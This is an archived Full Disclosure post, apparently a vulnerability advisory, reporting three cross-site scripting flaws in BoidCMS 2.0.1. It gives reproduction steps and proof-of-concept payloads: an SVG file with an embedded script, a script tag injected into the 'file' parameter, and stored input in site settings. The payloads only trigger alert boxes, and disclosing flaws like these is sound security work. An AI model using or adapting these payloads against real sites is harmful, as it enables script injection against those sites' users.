---
title: Multiple XSS Issues in boidcmsv2.0.1
url: https://seclists.org/fulldisclosure/2024/Mar/8
source: Full Disclosure
date: 2024-03-04
fetch_date: 2025-10-04T12:11:34.379525
---

# Multiple XSS Issues in boidcmsv2.0.1

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](7)
[By Date](date.html#8)
[![Next](/images/right-icon-16x16.png)](9)

[![Previous](/images/left-icon-16x16.png)](7)
[By Thread](index.html#8)
[![Next](/images/right-icon-16x16.png)](9)

![](/shared/images/nst-icons.svg#search)

# Multiple XSS Issues in boidcmsv2.0.1

---

*From*: Andrey Stoykov <mwebsec () gmail com>
*Date*: Sat, 2 Mar 2024 21:26:52 +0000

---

```
# Exploit Title: Multiple XSS Issues in boidcmsv2.0.1
# Date: 3/2024
# Exploit Author: Andrey Stoykov
# Version: 2.0.1
# Tested on: Ubuntu 22.04
# Blog: http://msecureltd.blogspot.com

XSS via SVG File Upload

Steps to Reproduce:

1. Login with admin user
2. Visit "Media" page
3. Upload xss.svg
4. Click "View" and XSS payload will execute

// xss.svg contents

<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "
http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd";>

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg";>
   <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900"
stroke="#004400"/>
   <script type="text/javascript">
      alert(`XSS`);
   </script>
</svg>

Reflected XSS:

Steps to Reproduce:

1. Login as admin
2. Visit "Media" page
3. Click "Delete" and intercept the HTTP GET request
4. In "file" parameter add the payload "<script>alert(1)</script>"
5. After forwarding the HTTP GET request a browser popup would surface

Stored XSS:

Steps to Reproduce:

1. Login as admin
2. Visit "Settings" page
3. Enter XSS payload in "Title", "Subtitle", "Footer"
4. Then visit the blog page
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](7)
[By Date](date.html#8)
[![Next](/images/right-icon-16x16.png)](9)

[![Previous](/images/left-icon-16x16.png)](7)
[By Thread](index.html#8)
[![Next](/images/right-icon-16x16.png)](9)

### Current thread:

* **Multiple XSS Issues in boidcmsv2.0.1** *Andrey Stoykov (Mar 02)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")